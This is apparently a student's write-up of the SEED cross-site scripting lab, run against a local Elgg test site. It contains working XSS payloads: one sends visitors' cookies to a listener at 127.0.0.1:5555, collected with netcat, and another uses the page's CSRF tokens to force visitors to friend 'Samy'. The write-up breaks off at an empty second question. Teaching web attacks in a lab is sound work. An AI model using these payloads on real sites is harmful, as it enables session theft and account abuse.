# CS 4173 Lab 5
#### Cross-Site Scripting Attack Lab

## Prerequisites
Versions of software used listed here:
- Environment: SEEDUbuntu 16.04

## Task 1: Posting a Malicious Message to Display an Alert Window

In this task,verify that the system is indeed vulnerable to cross-site scripting attacks. An easy way to test this in general is to submit content with a `<script>` tag and see if something simple such as an alert box can be called. We post the following contents to Samy's profile:

```html
<script>alert('XSS');</script>
```

Upon visiting Samy's profile, the visitor now gets an alert box popup saying "XSS" which confirms that the system is susceptible to XSS attacks.

## Task 2: Posting a Malicious Message to Display Cookies

Now that we can use XSS on this system, we can now start attempting to grab private user data, in particular cookies. We can modify the script above to do so:

```html
<script>alert(document.cookie);</script>
```

## Task 3: Stealing Cookies from the Victim’s Machine

With the above method, we can alert the cookies to the user's screen, but the attacker is not yet able to view this information. In order to transfer this data to the attacker, they can use a malicioius HTTP GET request, for example with a fake image. We can append the information to this request which goes to the attacker's machine. In this example, we are using the localhost IP address since we are testing on the same machine:

```html
<script>document.write('<img src="http://127.0.0.1:5555?c=' + escape(document.cookie) + '>')</script>
```

Then, using the `netcat` utility, we can view the incoming GET requests from the attacker which will include the appended cookie data:

```
$ nc -l 5555 -v
```

## Task 4: Becoming the Victim’s Friend


```html
<script type="text/javascript">
    window.onload = function () {
        let xhr = null;

        let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
        let token = "&__elgg_token="+elgg.security.token.__elgg_token;

        //Construct the HTTP request to add Samy as a friend.
        let sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;

        //Create and send xhr request to add friend
        xhr = new XMLHttpRequest();
        xhr.open("GET",sendurl,true);
        xhr.setRequestHeader("Host","www.xsslabelgg.com");
        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr.send();
    }
</script>
```

### Question 1

These two lines retrieve the tokens which are used to prevent CSRF attacks. In order to make a request, one must have the correct tokens or else the server will reject the request.

### Question 2